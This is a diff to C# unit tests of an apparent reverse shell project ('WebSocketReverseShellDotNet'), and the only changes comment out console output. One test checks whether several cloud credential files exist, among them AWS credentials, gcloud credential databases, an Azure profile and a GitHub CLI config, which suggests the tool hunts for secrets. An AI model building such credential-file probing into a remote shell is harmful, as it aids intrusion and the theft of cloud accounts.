@@ -20,7 +20,7 @@ namespace WebSocketReverseShellDotNet.test.utils
         {
             ReverseShellInfoInitialMessage result = OSUtil.GetComputerInfo();
 
-            Console.WriteLine(result);
+            /*Console.WriteLine(result);*/
 
             ClassicAssert.NotNull(result);
 
@@ -31,7 +31,7 @@ namespace WebSocketReverseShellDotNet.test.utils
         {
             string result = OSUtil.GetSystemTempDir();
 
-            Console.WriteLine(result);
+           /* Console.WriteLine(result);*/
 
             ClassicAssert.NotNull(result);
 
@@ -47,23 +47,23 @@ namespace WebSocketReverseShellDotNet.test.utils
             OSUtil.RunFunctionInThreadAsync(() =>
             {
                 test = "b";
-                Console.WriteLine("hello world ");
+               /* Console.WriteLine("hello world ");*/
 
             });
             
-            Console.WriteLine(test);
+            /*Console.WriteLine(test);*/
 
         }
 
         [Test]
         public void FileExists_ValidInput_ReturnsList()
         {
-            Console.WriteLine(OSUtil.FileExists("%USERPROFILE%\\.azure\\azureProfile.json"));
+/*            Console.WriteLine(OSUtil.FileExists("%USERPROFILE%\\.azure\\azureProfile.json"));
             Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gh\\config.yml"));
             Console.WriteLine(OSUtil.FileExists("%UserProfile%\\.aws\\credentials"));
             Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gcloud\\credentials.db"));
             Console.WriteLine(OSUtil.FileExists("%GOOGLE_APPLICATION_CREDENTIALS%"));
-            Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gcloud\\application_default_credentials.json"));
+            Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gcloud\\application_default_credentials.json"));*/
 
 
 
